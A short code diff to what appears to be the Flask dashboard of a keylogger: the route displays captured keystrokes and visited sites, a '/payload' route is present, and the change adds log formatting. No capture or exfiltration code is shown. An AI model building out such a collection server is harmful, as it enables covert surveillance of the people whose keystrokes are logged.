@@ -41,7 +41,9 @@ def home():
     keystrokes_data = [f"[{keystroke['timestamp']}] > {keystroke['keystroke']}" for keystroke in keystrokes]
     sites_data = [f"[{site['timestamp']}] > {site['site']}" for site in sites]
 
-    return render_template('index.html', keystrokes=keystrokes_data, sites=sites_data)
+    formatted_logs = format_logs(keylogs)
+    
+    return render_template('index.html', logs=formatted_logs,keystrokes=keystrokes_data, sites=sites_data)
 
 
 @app.route('/payload', methods=['GET', 'POST'])
